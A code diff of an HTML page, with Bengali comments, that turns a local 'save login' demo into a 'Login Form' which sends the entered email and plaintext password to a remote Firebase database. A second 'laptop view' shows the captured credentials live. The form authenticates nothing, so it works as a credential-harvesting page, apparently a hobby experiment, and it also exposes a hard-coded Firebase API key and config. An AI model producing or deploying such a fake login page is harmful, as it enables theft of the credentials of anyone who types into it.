@@ -1,135 +1,63 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Login & Save Data</title>
-
+  <title>Live Data Tracking</title>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
   <style>
-    body {
-      background: black;
-      color: white;
-      display: flex;
-      flex-direction: column; /* এলিমেন্টগুলো নিচে নিচে রাখার জন্য */
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      font-family: Arial, sans-serif;
-      margin: 0;
-    }
-
-    .box {
-      width: 300px;
-      padding: 20px;
-      border: 1px solid #333;
-      border-radius: 8px;
-    }
-
-    /* input এবং button এর সাইজ ঠিক রাখার জন্য box-sizing ব্যবহার করা হয়েছে */
-    input, button {
-      width: 100%; 
-      box-sizing: border-box; 
-      padding: 12px;
-      margin: 10px 0;
-      border-radius: 4px;
-      border: none;
-    }
-
-    input {
-      background: #222;
-      color: white;
-    }
-
-    button {
-      background: #ff0050;
-      color: white;
-      cursor: pointer;
-      font-weight: bold;
-    }
-
-    button:hover {
-      background: #e60045;
-    }
-
-    h2 {
-      text-align: center;
-    }
-
-    .display-area {
-      margin-top: 20px;
-      padding: 15px;
-      background: #111;
-      border: 1px dashed #555;
-      width: 300px;
-      text-align: center;
-    }
+    body { background: #000; color: #fff; font-family: Arial; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+    .box { width: 300px; padding: 20px; border: 1px solid #333; border-radius: 10px; }
+    input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: none; color: #fff; box-sizing: border-box; }
+    button { width: 100%; padding: 12px; background: #ff0050; border: none; color: #fff; cursor: pointer; font-weight: bold; }
+    #laptopView { margin-top: 20px; padding: 15px; border: 2px solid #ff0050; width: 300px; text-align: center; display: none; }
   </style>
 </head>
-
 <body>
-
   <div class="box">
-    <h2>Login</h2>
-    <input type="email" id="email" placeholder="Email">
-    <input type="password" id="password" placeholder="Password">
-    <button onclick="login()">Login</button>
+    <h2>Login Form</h2>
+    <input type="email" id="email" placeholder="Enter Email">
+    <input type="password" id="password" placeholder="Enter Password">
+    <button onclick="sendData()">Login</button>
   </div>
-
-  <div class="display-area" id="resultBox" style="display:none;">
-    <h3 style="font-size: 14px; color: #aaa;">Saved Information:</h3>
-    <p id="showEmail" style="color: #ff0050;"></p>
-    <p id="showPass" style="font-size: 12px; color: #777;"></p>
-    <button onclick="clearData()" style="background: #444; margin-top: 10px; font-size: 12px;">Dont Clik hear</button>
+  <div id="laptopView">
+    <h3 style="color: #ff0050;">Live Message from Mobile:</h3>
+    <p id="displayEmail">Waiting...</p>
+    <p id="displayPass" style="color: #777;"></p>
+    <button onclick="clearData()" style="background: #444; margin-top:10px; font-size: 11px;">Clear Screen</button>
   </div>
-  
-
   <script>
-    function login() {
-      // ইনপুট থেকে ভ্যালু নেওয়া
-      const emailValue = document.getElementById('email').value;
-      const passValue = document.getElementById('password').value;
-
-      if(emailValue === "" || passValue === "") {
-        alert("দয়া করে ইমেইল এবং পাসওয়ার্ড লিখুন!");
-        return;
-      }
-
-      // ব্রাউজারের Local Storage-এ ডাটা সেভ করা
-      localStorage.setItem('userEmail', emailValue);
-      localStorage.setItem('userPass', passValue);
-
-      alert("আপনার তথ্য সেভ হয়েছে!");
-
-      // সাথে সাথে ডাটাটি নিচে দেখানোর ফাংশন কল করা
-      displaySavedData();
-    }
-
-    function displaySavedData() {
-      const savedEmail = localStorage.getItem('userEmail');
-      const savedPass = localStorage.getItem('userPass');
-
-      if (savedEmail) {
-        document.getElementById('resultBox').style.display = "block";
-        document.getElementById('showEmail').innerText = "Email: " + savedEmail;
-        document.getElementById('showPass').innerText = "Password: " + savedPass;
+    const firebaseConfig = {
+      apiKey: "AIzaSyDybpDWjASFzZyazeyLJNUyrvhexQ3JYVY",
+      authDomain: "my-fast-project-8ae0f.firebaseapp.com",
+      databaseURL: "https://my-fast-project-8ae0f-default-rtdb.firebaseio.com",
+      projectId: "my-fast-project-8ae0f",
+      storageBucket: "my-fast-project-8ae0f.firebasestorage.app",
+      messagingSenderId: "1084988161384",
+      appId: "1:1084988161384:web:0409d9d64005df21d66add"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    function sendData() {
+      const email = document.getElementById('email').value;
+      const pass = document.getElementById('password').value;
+      if(email && pass) {
+        db.ref('messages').set({ email, pass });
+        alert("ল্যাপটপে পাঠানো হয়েছে!");
       }
     }
-
-    // পেজ রিফ্রেশ করলেও যাতে আগের ডাটা দেখা যায় (যদি সেভ থাকে)
-    window.onload = displaySavedData;
-    function clearData() {
-  // মেমোরি থেকে ডাটা মুছে ফেলা
-  localStorage.removeItem('userEmail');
-  localStorage.removeItem('userPass');
-  
-  // স্ক্রিন থেকে বক্সটি লুকিয়ে ফেলা
-  document.getElementById('resultBox').style.display = "none";
-  
-  alert("সব ডাটা মুছে ফেলা হয়েছে!");
-}
+    if (window.innerWidth > 768) {
+      document.getElementById('laptopView').style.display = "block";
+      db.ref('messages').on('value', (snapshot) => {
+        const data = snapshot.val();
+        if (data) {
+          document.getElementById('displayEmail').innerText = "Email: " + data.email;
+          document.getElementById('displayPass').innerText = "Password: " + data.pass;
+        }
+      });
+    }
+    function clearData() { db.ref('messages').remove(); }
   </script>
-  
-
 </body>
 </html>
